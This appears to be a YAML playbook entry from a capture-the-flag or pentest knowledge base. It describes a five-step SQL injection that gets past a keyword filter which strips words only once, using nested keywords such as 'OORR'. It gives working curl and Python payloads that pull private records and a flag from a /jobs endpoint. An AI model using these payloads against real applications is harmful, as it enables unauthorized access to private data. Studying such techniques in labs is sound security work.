name: sqli_allowlist_bypass
category: web
tags: [sqli, injection, filter_bypass, allowlist]
indicators:
  - "SQL query accepts user input"
  - "Allowlist/blacklist filtering SQL keywords"
  - "Filter uses replace() instead of regex"
  - "Private data requires filter bypass"

tricks:
  - name: "Step 1: Identify SQL injection point"
    when: "First access"
    how: "POST /jobs accepts job_type parameter concatenated into SQL"
    payload: |
      curl -X POST -H "Content-Type: application/json" \
        -d '{"job_type": "front-end"}' http://TARGET/jobs

  - name: "Step 2: Discover keyword filtering"
    when: "Try SQL injection"
    how: "Test common payloads to identify filtered keywords"
    payload: |
      # Filtered keywords: OR, AND, SELECT, UNION, FROM, WHERE
      # Test: ' OR 1=1-- -> blocked

  - name: "Step 3: Bypass with nested keywords"
    when: "Found replace() based filter"
    how: "replace() only runs once, nested keywords survive"
    payload: |
      OORR -> after filtering OR -> OR
      AANDND -> after filtering AND -> AND
      SELSELECTECT -> after filtering SELECT -> SELECT
      UNUNIONION -> after filtering UNION -> UNION

  - name: "Step 4: Craft bypass payload"
    when: "Understood filter mechanism"
    how: "Use ' OORR 1=1-- to bypass and get all records"
    payload: |
      curl -X POST -H "Content-Type: application/json" \
        -d '{"job_type":"'"'"' OORR 1=1--"}' \
        http://TARGET/jobs

  - name: "Step 5: Extract the flag"
    when: "Bypass successful"
    how: "Flag is in private job description"
    payload: |
      import requests
      resp = requests.post('http://TARGET/jobs', json={"job_type": "' OORR 1=1--"})
      print(resp.json())  # FLAG in private job description
